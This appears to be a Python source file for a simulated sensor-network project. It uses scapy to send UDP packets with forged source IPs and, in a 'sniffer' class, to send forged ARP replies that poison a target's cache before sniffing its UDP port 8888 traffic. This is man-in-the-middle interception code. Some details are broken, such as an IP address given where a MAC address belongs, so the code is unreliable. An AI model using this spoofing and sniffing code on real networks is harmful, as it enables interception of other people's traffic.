import sys
import socket 
import time
from helpers import get_interface_name, parse_command, get_config_size
import scapy.all as scapy
import subprocess 
import re

 

#class which stores network information 
class network: 

    def __init__(self): 
        self.IP = None 
        self.UDP_IP = None
        self.UDP_PORT = None
        self.mote_num = None 
        self.pins = {}
    
    #function which sets values
    def setup(self):
        self.UDP_IP = '127.0.0.1' # local host
        self.UDP_PORT = 12345  #random port 
  
     


    #function to set fake ip, dependent on global mote count  
    def set_fake_ip(self, input): 
        self.IP = input




    #Uses scapy library to send fake package from 
    def send_packet(self, dst_IP, dst_port,payload):
        ip = scapy.IP(src = self.IP, dst = dst_IP)
        udp = scapy.UDP(sport=self.UDP_PORT, dport=dst_port)
    

        scapy.send(ip/udp/payload)


class sniffer: 



    def __init__(self): 
        self.udp_packets = []
        self.actuator_packets = []
        self.sensor_packets = []
        self.dest_ip = None
  

    def set_dest_ip(self, input): 
        self.dest_ip = input

    def process_packet(self, packet): 
        print(packet.summary())
    
        
    def fake_out(self, target, spoof): 
        #hwdst = is the local adddress since the spoofing occurs at a local level
        response = scapy.ARP(pdst = target, hwdst = '127.0.0.1', psrc= spoof, op = 'is-at')
        scapy.send(response, verbose=False)
        return True 
    

    def start_fake_out(self):
        print("Starting ARP spoofing on destination IP.")
        self.fake_out(self.dest_ip, '127.0.0.1')  # Spoofing self as destination
        self.fake_out('127.0.0.1', self.dest_ip)  # Spoofing destination as self


    def split_paths(self, data): 
        pin_num = data[0]
        if pin_num == 1: 
            self.actuator_packets.append(data)
        else: 
            self.sensor_packets.append(data)

    def begin_sniffing(self):
        # Ensure ARP spoofing is set up
        if not (self.fake_out('127.0.0.1', self.dest_ip)) or not (self.fake_out(self.dest_ip,'127.0.0.1')): 
            print("ARP sequence failed, exiting.")
            return 

        # Begin sniffing with a filter for UDP traffic on port 8888
        print(f"Beginning to sniff from {self.dest_ip} on port 8888.")
        filter_str = 'udp and port 8888'

        scapy.sniff(filter=filter_str, prn=self.process_packet, store=False)


        
